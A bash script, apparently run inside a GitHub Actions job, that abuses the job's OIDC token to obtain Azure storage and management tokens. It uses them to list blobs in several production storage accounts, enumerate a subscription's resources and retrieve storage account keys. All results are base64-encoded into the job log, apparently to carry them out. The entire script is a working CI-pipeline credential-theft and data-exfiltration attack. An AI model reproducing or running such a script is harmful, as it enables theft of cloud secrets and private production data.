#!/bin/bash
set -e

echo "=== OIDC Token ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "OIDC_LEN=${#OIDC}"

echo "=== Azure AD Exchange ==="
AAD=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://storage.azure.com/.default" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
  -d "assertion=$OIDC" \
  -d "requested_token_use=on_behalf_of" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
ST=$(echo "$AAD" | jq -r .access_token)
if [ "$ST" = "null" ] || [ -z "$ST" ]; then
  echo "OBO failed, trying client_credentials with federated..."
  AAD=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
    -d "scope=https://storage.azure.com/.default" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$OIDC")
  ST=$(echo "$AAD" | jq -r .access_token)
fi
echo "STORAGE_TOKEN_LEN=${#ST}"
if [ "$ST" = "null" ] || [ -z "$ST" ]; then
  echo "STORAGE_TOKEN_ERROR=$(echo "$AAD" | jq -c .)"
  # Try management scope instead
  echo "=== Trying management scope ==="
  AAD2=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
    -d "scope=https://management.azure.com/.default" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$OIDC")
  MT=$(echo "$AAD2" | jq -r .access_token)
  echo "MGMT_TOKEN_LEN=${#MT}"
fi

# If we got storage token, list blobs
if [ "$ST" != "null" ] && [ -n "$ST" ]; then
  echo "=== List Blobs: sttblbackupprodx3euoz/exports ==="
  B1=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" \
    "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list")
  echo "EXPORTS_B64=$(echo "$B1" | base64 -w0)"
  
  echo "=== List Blobs: sttblappcfgprodx3euoz/config ==="
  B2=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" \
    "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list")
  echo "CONFIG_B64=$(echo "$B2" | base64 -w0)"
  
  echo "=== List Blobs: sttblcilogsprodx3euoz/logs ==="
  B3=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" \
    "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs?restype=container&comp=list")
  echo "LOGS_B64=$(echo "$B3" | base64 -w0)"
  
  echo "=== List Blobs: sttblarchiveprodx3euoz ==="
  B4=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" \
    "https://sttblarchiveprodx3euoz.blob.core.windows.net/?comp=list&include=metadata")
  echo "ARCHIVE_B64=$(echo "$B4" | base64 -w0)"
fi

# Also try management token for resources if storage failed
if [ -n "$MT" ] && [ "$MT" != "null" ]; then
  echo "=== Full Resource List ==="
  RES=$(curl -sS -H "Authorization: Bearer $MT" \
    "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resources?api-version=2021-04-01")
  echo "RESOURCES_B64=$(echo "$RES" | base64 -w0)"
  
  # List storage account keys
  for SA in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblarchiveprodx3euoz; do
    echo "=== Storage Keys: $SA ==="
    KEYS=$(curl -sS -X POST -H "Authorization: Bearer $MT" -H "Content-Length: 0" \
      "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-05-01")
    echo "KEYS_${SA}_B64=$(echo "$KEYS" | base64 -w0)"
  done
  
  # Also try listing blobs via management token with storage scope
  echo "=== Try storage data with mgmt token ==="
  B1M=$(curl -sS -H "Authorization: Bearer $MT" -H "x-ms-version: 2020-10-02" \
    "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" 2>&1)
  echo "EXPORTS_MGMT=$(echo "$B1M" | head -5 | base64 -w0)"
fi

echo "=== DONE ==="